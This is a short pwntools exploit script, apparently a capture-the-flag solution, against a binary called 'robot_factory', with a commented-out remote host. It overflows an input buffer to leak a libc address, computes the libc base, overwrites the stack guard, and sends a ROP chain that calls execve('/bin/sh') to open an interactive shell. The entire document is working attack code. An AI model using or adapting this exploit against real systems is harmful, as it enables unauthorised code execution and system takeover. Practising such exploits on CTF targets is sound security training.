from pwn import *

elf = ELF('./robot_factory')
libc = ELF('./libc.so.6')

# context.log_level = "DEBUG"

# r = remote('167.172.49.117', 30563)
r = elf.process()

############################ LIBC LEAK ############################
r.sendlineafter(b' (n/s) > ', b's')
r.sendlineafter(b' (a/s/m) > ', b'a')

r.sendlineafter(b'1: ', b'A' * 96)
r.sendlineafter(b'2: ', b'B' * 8)

leak = r.recvuntil(b'\n\0', drop=True).split(b' ')[-1]
leak = leak.replace(b'A', b'').replace(b'B', b'')
log.success(f"leak : {leak}")

libc_base = leak.ljust(8, b'\x00')
libc_base = u64(libc_base) - 0x9a00b
log.success(f'glibc base address : {hex(libc_base)}')

############################ GADGETS ############################
ret         = p64(libc_base + 0x025679) # ret
pop_rdi     = p64(libc_base + 0x026b72) # pop rdi ; ret
pop_rsi     = p64(libc_base + 0x027529) # pop rsi ; ret
pop_rdx_rbx = p64(libc_base + 0x11c371) # pop rdx ; pop r12 ; ret

execve_addr = p64(libc_base + libc.sym['execve'])
binsh_addr  = p64(libc_base + next(libc.search(b'/bin/sh')))

######################## OVERFLOW AND ROP ########################
r.sendline(b's')
r.sendlineafter(b' (a/s/m) > ', b'm')

# tcbhead_t.stack_guard overwrite
rop = b'A' * 40

# execve("/bin/sh", NULL, NULL)
rop += pop_rdi
rop += binsh_addr
rop += pop_rsi
rop += p64(0)
rop += pop_rdx_rbx
rop += p64(0)
rop += p64(0)
rop += execve_addr
rop = rop.ljust(120, b'B')

########### GET SHELL ###########
r.sendlineafter(b'1: ', rop)
r.sendlineafter(b'size: ', b'20')
r.recv()
r.interactive("pwned ~$ ")